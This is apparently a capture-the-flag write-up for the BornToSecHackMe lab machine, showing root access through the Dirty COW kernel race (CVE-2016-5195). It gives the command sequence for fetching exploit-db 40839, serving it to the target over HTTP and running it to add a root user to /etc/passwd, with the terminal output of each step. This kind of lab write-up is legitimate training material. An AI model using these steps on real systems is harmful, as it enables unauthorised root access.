
#  Method 2
check the target system's kernel version:

```
zaz@BornToSecHackMe:~$ uname -a
Linux BornToSecHackMe 3.2.0-91-generic-pae #129-Ubuntu SMP Wed Sep 9 11:27:47 UTC 2015 i686 i686 i386 GNU/Linux
```

Analysis: The kernel version 3.2.0-91 is vulnerable to Dirty COW (CVE-2016-5195).

Search for the exploit using searchsploit:

```
❯ searchsploit linux 3.2.0
....
Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' 'PTRACE_POKEDATA' Race Condition Privilege Escalation (/etc/p | linux/local/40839.c
....
```

##  Vulnerability Overview

| Attribute | Details |
|:----------|:--------|
| **CVE** | CVE-2016-5195 |
| **Type** | Local Privilege Escalation |
| **Impact** | Root access via `/etc/passwd` modification |
| **Exploit** | [exploit-db 40839](https://www.exploit-db.com/exploits/40839) |

---

##  1. Technical Breakdown

The exploit leverages a **race condition** in the kernel's Copy-on-Write (COW) mechanism:

| Step | Description |
|:----:|:------------|
| **1** | Maps `/etc/passwd` into a **READONLY** memory zone using `mmap()`. |
| **2** | Forks a child process using `fork()`. |
| **3** | Child spawns a thread that calls `madvise(MADV_DONTNEED)` on the mapped memory — advising the kernel to unload it from cache. |
| **4** | Child pauses with `ptrace(PTRACE_TRACEME)`, allowing the parent to attach via `ptrace()`. |
| **5** | Parent **does not wait** for the child. Instead, it writes a new root user line into the READONLY memory using `ptrace(PTRACE_POKETEXT)`. |
| **6** | **Race condition** occurs: parent writes while kernel is unloading the page, bypassing read-only protection and modifying `/etc/passwd` directly on disk. |

---

##  2. Exploitation Steps

###  Step 1: Download, Compile & Execute

On attacker machine (Kali), download the exploit:

```bash
❯ cd /tmp
❯ wget https://www.exploit-db.com/raw/40839 -O dirtycow.c
--2026-07-07 10:08:16--  https://www.exploit-db.com/raw/40839
Loaded CA certificate '/etc/ssl/certs/ca-certificates.crt'
Resolving www.exploit-db.com... 192.124.249.13
Connecting to www.exploit-db.com|192.124.249.13|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5006 (4.9K) [text/plain]
Saving to: ‘dirtycow.c’

dirtycow.c                        100%[=============================================================>]   4.89K  --.-KB/s    in 0s

2026-07-07 10:08:17 (70.3 MB/s) - ‘dirtycow.c’ saved [5006/5006]
```

Start a Python HTTP server to transfer the file:

```bash
❯ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
192.168.56.101 - - [07/Jul/2026 10:10:17] "GET /dirtycow.c HTTP/1.1" 200 -
```

On the target machine, download the exploit:

```bash
zaz@BornToSecHackMe:~$ wget http://192.168.56.1:8000/dirtycow.c -O dirtycow.c
--2026-07-07 11:10:15--  http://192.168.56.1:8000/dirtycow.c
Connecting to 192.168.56.1:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5006 (4.9K) [text/plain]
Saving to: `dirtycow.c'

100%[==========================================================>] 5,006       --.-K/s   in 0s

2026-07-07 11:10:15 (55.1 MB/s) - `dirtycow.c' saved [5006/5006]
```

```text
zaz@BornToSecHackMe:~$ ./dirty
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password:
Complete line:
firefart:fiblC0uIAHDGs:0:0:pwned:/root:/bin/bash

mmap: b7fda000
madvise 0

ptrace 0
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password 'haha'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password 'haha'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd

```

###  Step 3: Switch to Root

```
zaz@BornToSecHackMe:~$ su firefart
Password:
firefart@BornToSecHackMe:/home/zaz# id
uid=0(firefart) gid=0(root) groups=0(root)
firefart@BornToSecHackMe:/home/zaz#
firefart@BornToSecHackMe:~# cd
firefart@BornToSecHackMe:~# ls
README
firefart@BornToSecHackMe:~# cat README
CONGRATULATIONS !!!!
To be continued...
firefart@BornToSecHackMe:~#
```